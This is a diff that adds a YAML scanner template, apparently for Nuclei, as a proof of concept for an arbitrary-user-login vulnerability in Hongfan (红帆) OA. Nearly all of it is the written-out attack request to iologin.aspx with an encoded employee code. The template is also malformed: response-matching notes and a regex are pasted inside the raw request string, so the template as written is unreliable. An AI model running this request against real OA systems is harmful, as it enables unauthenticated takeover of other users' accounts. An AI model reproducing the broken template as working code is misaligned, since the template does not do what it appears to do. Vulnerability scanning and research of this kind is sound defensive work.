@@ -1,0 +1,34 @@
+id: poc-cg66g8nqtg933uev
+info:
+  name: 红帆 OA 任意用户登录漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cg66g8nqtg933uev'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cg66g8nqtg933uev
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /iOffice/prg/interface/iologin.aspx?iempcode=SENHRkU=&reurl=1 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?HCGFE)(?=.*?找不到对应的人员).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
